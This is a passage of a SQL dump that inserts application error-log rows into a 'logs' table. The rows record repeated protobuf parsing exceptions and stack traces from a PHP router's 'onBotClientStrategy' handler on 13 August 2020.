require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 02:08:43'),
(167, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:47:14'),
(168, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:47:17'),
(169, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:47:19'),
(170, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:47:21'),
(171, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:47:23'),
(172, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:47:24'),
(173, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:47:25'),
(174, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:47:27'),
(175, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:47:28'),
(176, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:47:29'),
(177, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:47:31'),
(178, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:47:32'),
(179, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:4 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:221\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x14\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x14\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x14\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:50:49'),
(180, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:51:33');
INSERT INTO `logs` (`id`, `controller`, `function`, `log`, `error_time`) VALUES
(181, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:51:34'),
(182, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'=\\xE8\\x08@\\x04\\x82\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'=\\xE8\\x08@\\x04\\x82\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'=\\xE8\\x08@\\x04\\x82\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:51:38'),
(183, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:51:40'),
(184, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:51:41'),
(185, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:51:42'),
(186, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:51:44'),
(187, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:51:45'),
(188, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:51:46'),
(189, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:51:48'),
(190, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:51:49'),
(191, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'l\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'l\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'l\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:52:05'),
(192, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'I\\xEC\\x8B\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'I\\xEC\\x8B\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'I\\xEC\\x8B\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:52:08'),
(193, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'I\\xEC\\x8B\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'I\\xEC\\x8B\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'I\\xEC\\x8B\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:52:10'),
(194, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'|m\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'|m\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'|m\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:52:21'),
(195, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:0 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:221\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x08\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x08\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x08\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:52:53'),
